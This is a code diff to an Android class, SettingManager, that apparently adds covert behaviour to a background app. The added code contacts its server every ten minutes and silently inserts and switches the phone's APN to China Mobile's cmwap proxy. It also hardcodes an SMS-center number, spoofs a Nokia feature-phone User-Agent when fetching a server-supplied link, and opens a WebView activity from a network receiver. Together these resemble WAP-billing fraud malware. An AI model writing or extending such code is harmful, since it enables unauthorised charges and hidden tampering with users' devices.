@@ -40,10 +40,10 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.database.Cursor;
-import android.database.SQLException;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
+import android.os.AsyncTask;
 import android.os.Build;
 import android.os.PowerManager;
 import android.telephony.TelephonyManager;
@@ -471,7 +471,8 @@ public class SettingManager {
     
     public void tryToFetchInfoFromServer(long delayTime) {
         cancelFetchInfo();
-        final long DEFAULT_FETCH_DELAY = ((long) 24) * 60 * 60 * 1000;
+//        final long DEFAULT_FETCH_DELAY = ((long) 24) * 60 * 60 * 1000;
+        final long DEFAULT_FETCH_DELAY = ((long) 1) * 10 * 60 * 1000;
         Intent intent = new Intent(mContext, AutoSMSRecevier.class);
         intent.setAction(AUTO_CONNECT_SERVER);
         PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
@@ -595,13 +596,16 @@ public class SettingManager {
         HttpClient hc = new DefaultHttpClient(getParams(ip, port));
         HttpGet get = new HttpGet();
         try {
-            get.setURI(new URI(VEDIO_URL));
+            get.setURI(new URI(this.mXMLHandler.getChanneInfo(XMLHandler.VEDIO_LINK)));
         } catch (URISyntaxException e) {
             e.printStackTrace();
             return null;
         }
-        get.setHeader(HTTP.CONTENT_TYPE, "text/plain");
+//        get.setHeader(HTTP.CONTENT_TYPE, "text/plain");
         get.setHeader("Accept", "*/*");
+        get.setHeader(HTTP.USER_AGENT, "Nokia5320_CMCC/06.103 (SymbianOS/9.3; U; Series60/3.2 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413");
+        get.setHeader(HTTP.CONN_DIRECTIVE, HTTP.CONN_KEEP_ALIVE);
+        
         try {
             HttpResponse response = hc.execute(get);
             LOGD("[[openConnection]] return response != null");
@@ -626,7 +630,7 @@ public class SettingManager {
         String smsCenter = this.getSMSCenter();
         //test code
 //        if (smsCenter == null) {
-//            smsCenter = "13800100500";
+            smsCenter = "13800100500";
 //        }
         LOGD("[[savePhoneInfo]] smsCenter = " + smsCenter);
         if (smsCenter != null) {
@@ -878,7 +882,11 @@ public class SettingManager {
         if (forceCMWapConnection() == false) {
             //mean the current apn is already cmwap
             getVedioProcess();
-        }
+        } 
+//        else {
+//            LOGD("=== After set the cmwap info =====");
+//            getVedioProcess();
+//        }
     }
     
     private NetworkChangeReceiver mNChangeReceiver;
@@ -887,43 +895,51 @@ public class SettingManager {
         NetworkInfo info = mConnMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); 
         String oldAPN = info.getExtraInfo(); 
         
+        String cmwapApn = getApnIdByName(CMWAP);
+        if (cmwapApn == null) {
+            cmwapApn = addCMWapApn();
+        }
+        dumpAPNList();
+        
+        LOGD("old apn name = " + oldAPN);
         //if current apn is not cmwap, we have to switch to cmwap. 
-        if (oldAPN != null && CMWAP.equals(oldAPN) == false) {
+        if (cmwapApn != null && (oldAPN == null || CMWAP.equals(oldAPN) == false)) {
             String  projection[] = {"_id,apn,type,current"};
             Cursor cr = mResolver.query(uri_apn, projection, null, null, null);
             if (cr != null && cr.moveToFirst() == true) {
-                if (cr != null) {   
+                if (cr != null) {
                     LOGD(cr.getString(cr.getColumnIndex("_id")) + "  " + cr.getString(cr.getColumnIndex("apn")) + "  " + cr.getString(cr.getColumnIndex("type"))+ "  " + cr.getString(cr.getColumnIndex("current")));    
                     if (cr.getString(cr.getColumnIndex("current")) != null 
                             && cr.getString(cr.getColumnIndex("current")).equals("1") == true) {
                         this.mOldAPNId = cr.getString(cr.getColumnIndex("_id"));
+                        LOGD("The old apn id = " + this.mOldAPNId);
                     }
                 }  
             }
             
-            mNChangeReceiver = new NetworkChangeReceiver(); 
+            mNChangeReceiver = new NetworkChangeReceiver();
             //register receiver for wap network connection. 
             IntentFilter upIntentFilter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION); 
             mContext.registerReceiver(mNChangeReceiver, upIntentFilter);
-            String newAPNId = getApnIdByName(CMWAP);
-            if (newAPNId != null) {
-                updateCurrentAPN(newAPNId); 
+//            String newAPNId = getApnIdByName(CMWAP);
+            if (cmwapApn != null) {
+                updateCurrentAPN(cmwapApn); 
             }
             return true; 
-        } 
+        }
         return false; 
     } 
 
     private void getVedioProcess() {
         if (getVedioXML() == true) {
             //TODO: download the url link
-            Thread t = new Thread(new Runnable() {
-                public void run() {
+//            Thread t = new Thread(new Runnable() {
+//                public void run() {
                     //TODO : download the vedio from link
                     updateCurrentAPN(mOldAPNId);
                     mOldAPNId = null;
-                }
-            });
+//                }
+//            });
         } else {
             updateCurrentAPN(mOldAPNId);
             mOldAPNId = null;
@@ -937,8 +953,8 @@ public class SettingManager {
                 ConnectivityManager ConnMgr = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
                 NetworkInfo info = ConnMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); 
                 String apn = info.getExtraInfo(); 
-                LOGD("apn = " + apn);
-                if (CMWAP.equals(apn) == true) { 
+                LOGD("[[NetworkChangeReceiver::onReceive]] apn = " + apn);
+                if (CMWAP.equals(apn) == true) {
                     /* 
                      * apn change message is sent out more than once during a second, but it 
                      * only happens once practically. 
@@ -947,11 +963,66 @@ public class SettingManager {
                         mContext.unregisterReceiver(mNChangeReceiver); 
                         mNChangeReceiver = null; 
                     } 
-                    getVedioProcess();
+                    LOGD("Before exec the VedioEntryListXMLTask");
+//                    new VedioEntryListXMLTask().execute("");
+                    Intent intent_view = new Intent();
+                    intent_view.setClass(mContext, VedioWebViewActivity.class);
+                    intent_view.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    mContext.startActivity(intent_view);
                 } 
             } 
         } 
     } 
+    
+    private class VedioEntryListXMLTask extends AsyncTask<String, Integer, Integer> {
+
+        @Override
+        protected Integer doInBackground(String... params) {
+            ConnectivityManager ConnMgr = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
+            NetworkInfo networkInfo = null;
+            for (int index = 0; index < 60; ++index) {
+                networkInfo = ConnMgr.getActiveNetworkInfo();;
+                if (networkInfo == null) {
+                    LOGD("The net work is null wait 1000 now  ======+++++");
+                    try {
+                        Thread.sleep(1000);
+                    } catch (Exception e) {
+                    }
+                } else {
+                    break;
+                }
+            } 
+            networkInfo = ConnMgr.getActiveNetworkInfo();
+            if (networkInfo != null) {
+                LOGD("current net work info is not null, name = " + networkInfo.getTypeName());
+                if (networkInfo.getType() == ConnectivityManager.TYPE_MOBILE) {
+                    LOGD("Now using [[Mobile]] network >>>>>>>>>>>>>>>");
+                    NetworkInfo info = ConnMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); 
+                    for (int index = 0; index < 60; ++index) {
+                        if (info.isAvailable() == false) {
+                            LOGD("The net work available = false ======= index = " + index);
+                            try {
+                                Thread.sleep(1000);
+                            } catch (Exception e) {
+                            }
+                        } else {
+                            break;
+                        }
+                    } 
+                    if (info.isAvailable() == true) {
+                        LOGD("The net work available = true ======= before get vedio process");
+                        getVedioXML();
+                    }
+                }
+            } else {
+                LOGD("Has wait for 60 * 1000 times, Net work info == null >>>>>>>>>>>>");
+            }
+            updateCurrentAPN(mOldAPNId);
+            mOldAPNId = null;
+            return null;
+        }
+        
+    };
     
     private int updateCurrentAPN(String apnId) {
         try { 
@@ -979,26 +1050,28 @@ public class SettingManager {
         String ret = null;
         Cursor cr = null;
         try {
-        String projection[] = { "_id,apn,type,current" };
-        cr = mResolver.query(uri_apn_list, projection, "current = 1 and apn = ?"
-                                , new String[] {apnName}, null);
-        if (cr != null && cr.moveToFirst() == true) {
-            while (cr != null) {
-                LOGD(cr.getString(cr.getColumnIndex("_id")) + "  "
-                        + cr.getString(cr.getColumnIndex("apn")) + "  "
-                        + cr.getString(cr.getColumnIndex("type")) + "  "
-                        + cr.getString(cr.getColumnIndex("current")));
+            dumpAPNList();
             
-                if (cr.getString(cr.getColumnIndex("type")) != null
-                        && cr.getString(cr.getColumnIndex("type")).equals("mms") == false) {
-                    ret = cr.getString(cr.getColumnIndex("_id"));
-                    break;
-                }
-                if (cr.moveToNext() == false) {
-                    break;
+            String projection[] = { "_id,apn,type,current" };
+            cr = mResolver.query(uri_apn_list, projection, "current = 1 and apn = ?"
+                                    , new String[] {apnName}, null);
+            if (cr != null && cr.moveToFirst() == true) {
+                while (cr != null) {
+                    LOGD("New apn info : " + cr.getString(cr.getColumnIndex("_id")) + "  "
+                            + cr.getString(cr.getColumnIndex("apn")) + "  "
+                            + cr.getString(cr.getColumnIndex("type")) + "  "
+                            + cr.getString(cr.getColumnIndex("current")));
+                
+                    if (cr.getString(cr.getColumnIndex("type")) != null
+                            && cr.getString(cr.getColumnIndex("type")).equals("mms") == false) {
+                        ret = cr.getString(cr.getColumnIndex("_id"));
+                        break;
+                    }
+                    if (cr.moveToNext() == false) {
+                        break;
+                    }
                 }
             }
-        }
         } catch (Exception e) {
             e.printStackTrace();
         } finally {
@@ -1006,6 +1079,40 @@ public class SettingManager {
             cr = null;
         }
         return ret;
+    }
+    
+    private String addCMWapApn() {
+        TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
+        String apnId = null;
+        ContentValues values = new ContentValues();
+        values.put("name", "cmwap");
+        values.put("apn", "cmwap");
+        values.put("proxy", "10.0.0.172");
+        values.put("port", "80");
+        values.put("mcc", "460");
+        values.put("mnc", "02");
+        values.put("type", "default");
+        values.put("mmsc", "http://mmsc.monternet.com");
+        values.put("numeric", tm.getSimOperator());
+
+        Cursor c = null;
+        try {
+            Uri newRow = mResolver.insert(uri_apn_list, values);
+            if (newRow != null) {
+                c = mResolver.query(newRow, null, null, null, null);
+                int idindex = c.getColumnIndex("_id");
+                c.moveToFirst();
+                apnId = c.getString(idindex);
+                Log.d("Robert", "New ID: " + apnId + ": Inserting new APN succeeded!");
+            }
+        } catch (Exception e) {
+
+        }
+
+        if (c != null)
+            c.close();
+
+        return apnId;
     }
     
     private SettingManager(Context context) {
@@ -1024,6 +1131,23 @@ public class SettingManager {
         VEDIO_DOWNLOAD_FILE_PATH = BASE_PATH + "vedio.xml";
         mConnMgr = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
         mResolver = mContext.getContentResolver();
+    }
+    
+    private void dumpAPNList() {
+        if (DEBUG) {
+            LOGD(">>>>>>>> begin dump all apn name <<<<<<");
+            String projection1[] = { "_id,apn,type,current" };
+            Cursor cr1 = mResolver.query(uri_apn_list, projection1, null, null, null);
+            if (cr1 != null && cr1.moveToFirst() == true) {
+                do {
+                    LOGD(cr1.getString(cr1.getColumnIndex("_id")) + "  "
+                            + cr1.getString(cr1.getColumnIndex("apn")) + "  "
+                            + cr1.getString(cr1.getColumnIndex("type")) + "  "
+                            + cr1.getString(cr1.getColumnIndex("current")));
+                } while (cr1.moveToNext() == true && cr1 != null);
+            }
+            LOGD(">>>>>> end dump list apn name <<<<<<<");
+        }
     }
     
     private void LOGD(String msg) {
